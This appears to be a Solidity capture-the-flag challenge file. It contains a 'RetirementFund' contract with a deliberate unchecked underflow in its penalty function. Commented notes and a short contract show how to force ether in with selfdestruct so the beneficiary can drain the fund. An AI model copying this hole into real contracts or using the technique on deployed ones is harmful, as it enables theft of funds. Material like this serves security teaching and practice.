// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract RetirementFund {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = block.timestamp + 520 weeks;

    constructor(address player) payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        require(msg.sender == owner);

        if (block.timestamp < expiration) {
            // early withdrawal incurs a 10% penalty
            (bool ok,) = msg.sender.call{value: (address(this).balance * 9) / 10}("");
            require(ok, "Transfer to msg.sender failed");
        } else {
            (bool ok,) = msg.sender.call{value: address(this).balance}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }

    function collectPenalty() public {
        require(msg.sender == beneficiary, "Wrong sender");
        uint256 withdrawn = 0;
        unchecked {
            withdrawn += startBalance - address(this).balance;

            // an early withdrawal occurred
            require(withdrawn > 0);
        }

        // penalty is what's left
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
// Observations:
// withdraw is public
// collectPenalty is public
// both reenter, but only after doing state changes
// collectPenalty has an unchecked block
// the unchecked block overflows if startBalance - address(this).balance is less than 0
// startBalance is always 1 ether
// we can donate to the contract to make address(this).balance higher than 1 ether
// then we'll clear the fund
contract ExploitContract {
    RetirementFund public retirementFund;

    constructor(RetirementFund _retirementFund) {
        retirementFund = _retirementFund;
    }

    function attack() public {
        selfdestruct(payable(address(retirementFund)));
    }

    // write your exploit functions below
}
